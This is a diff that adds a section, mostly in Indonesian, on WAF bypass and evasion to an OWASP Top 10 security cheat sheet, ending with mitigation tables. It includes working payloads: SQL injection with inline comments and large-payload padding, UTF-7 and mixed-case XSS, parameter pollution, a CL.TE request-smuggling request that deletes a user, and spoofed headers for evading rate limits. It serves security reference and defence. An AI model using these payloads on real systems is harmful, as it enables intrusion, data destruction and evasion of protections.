@@ -392,6 +392,116 @@ Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ
 
 ---
 
+## WAF Bypass & Evasion Techniques
+
+Teknik-teknik ini mengeksploitasi arsitektur, parsing, atau normalisasi mismatch antara WAF proxy layer dan backend application server.
+
+### A. Platform-Specific Bypass
+
+| Platform | Teknik | Mekanisme | Contoh |
+|----------|--------|-----------|--------|
+| **Cloudflare** | Origin IP Direct Access | Temukan origin IP via historical DNS / SSL cert monitoring untuk circumventing Cloudflare proxy | `Host: direct-origin-ip.internal` |
+| **Cloudflare** | Worker / Alternative Route | Akses backend via non-standard port yang bypass Managed Rulesets | Port `8080`, `8443` |
+| **ModSecurity** | ReDoS / Resource Exhaustion | Payload nested dalam / backslash escaping loops trigger timeout → fail-open | `/*!50000UniOn*//*!50000SeLeCt*/ 1,2,auth_token FROM users;` |
+| **ModSecurity** | Inline Comment Interruption | Non-standard execution path variants break regex signatures | `SeLeCt * FrOm` dengan komentar bersarang |
+| **AWS WAF** | Large Payload Padding | Prepending data >16KB pushes malicious string beyond inspection threshold | `{"padding":"[16384xA]", "vuln":"'; DROP TABLE users;--"}` |
+| **Akamai** | HTML Injection & Event Mutation | Substitusi event handler standar dengan nested mathematical evaluations | `<math><mi//href="javascript:alert(1)">CLICK</mi></math>` |
+
+### B. Protocol & Encoding Bypass
+
+**1. Content-Type Mutation**
+
+Memanfaatkan perbedaan parsing antara WAF dan backend deserializer.
+
+```http
+Content-Type: application/json; charset=utf-7
+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+```
+
+**2. Case Manipulation**
+
+Mengeksploitasi token array WAF yang incomplete terhadap case-folding.
+
+```html
+<sCrIpt>conSole.loG(1)</ScRiPt>
+```
+
+**3. Unicode Normalization (NFKD)**
+
+WAF membaca raw multi-byte secara literal, backend menormalisasi ke ASCII.
+
+```
+Raw:    ＳＥＬＥＣＴ
+WAF:    [no match]
+Backend: SELECT
+```
+
+**4. HTTP Parameter Pollution (HPP)**
+
+WAF memvalidasi parameter individu, backend menggabungkan semua nilai.
+
+```http
+/?id=1+UNION&id=SELECT&id=pass,user+FROM+members
+```
+- WAF Sees: `id=1+UNION`, `id=SELECT` (harmless standalone)
+- Backend (ASP.NET): `id=1+UNION,SELECT,pass,user+FROM+members`
+
+**5. HTTP Request Smuggling (CL.TE)**
+
+Konflik Content-Length vs Transfer-Encoding antara frontend WAF dan backend.
+
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+POST /admin/deleteUser HTTP/1.1
+Host: target.com
+Content-Length: 15
+
+username=victim
+```
+
+**6. Rate-Limit Bypass via Header Spoofing**
+
+Memutasi header proxy untuk menghindari rate limiting.
+
+```http
+X-Forwarded-For: 10.0.0.[DYNAMIC_IP]
+X-Real-IP: 192.168.[DYNAMIC_IP]
+True-Client-IP: 203.0.113.[DYNAMIC_IP]
+```
+
+### C. Per-Category OWASP Bypass Matrix
+
+| OWASP Category | Primary Evasion Vector | Mitigation Strategy |
+|----------------|----------------------|---------------------|
+| **A01: Broken Access Control** | Path traversal encoding, HPP | Strict canonicalization rules, block routing headers (`X-Original-URL`, `X-Rewrite-URL`) |
+| **A02: Security Misconfiguration** | Non-standard HTTP methods, header spoofing | Block `X-Original-URL`, `X-Rewrite-URL` at edge layer |
+| **A03: Supply Chain Failures** | Malicious component ingestion, multipart boundary mutation | RASP, SBOM verification |
+| **A04: Cryptographic Failures** | Protocol mutation, intercepted cookie tampering | Secure cipher termination at WAF level |
+| **A05: Injection** | Unicode decomposition, hex-space swapping | Dual-pass decode engines (raw + normalized) |
+| **A06: Insecure Design** | Logic exhaustion, distributed rate-limit bypass | Session-tied validation, JA3/JA4 fingerprinting |
+| **A07: Authentication Failures** | JSON structure manipulation, credential stuffing | Strict API schema enforcement, dynamic client challenges |
+| **A08: Integrity Failures** | Chunked deserialization across multiple fragments | Restrict object formats, prevent arbitrary class instantiation |
+| **A09: Logging Failures** | Log injection obfuscation, ReDoS | Standardize SIEM input, sanitize before logging |
+| **A10: Exceptional Conditions** | Error leakage via null byte injection | Block verbose server error banners at WAF |
+
+### D. Blue Team Mitigations
+
+| Mitigation | Implementasi |
+|------------|--------------|
+| Multi-Pass Normalization | Proses input melalui repeated normalization cycles hingga output stabil |
+| Strict Size Discard | Drop request dengan Content-Length > inspection limit (kecuali upload endpoint authorized) |
+| Zero-Trust Ingress | Firewall rule: only accept traffic dari verified cloud-provider IP blocks |
+| Context-Aware Hunting | Match JA4 fingerprints vs User-Agent, deploy canary paths |
+
+---
+
 ## References
 
 - [OWASP Top 10:2025 Official](https://owasp.org/Top10/2025/)
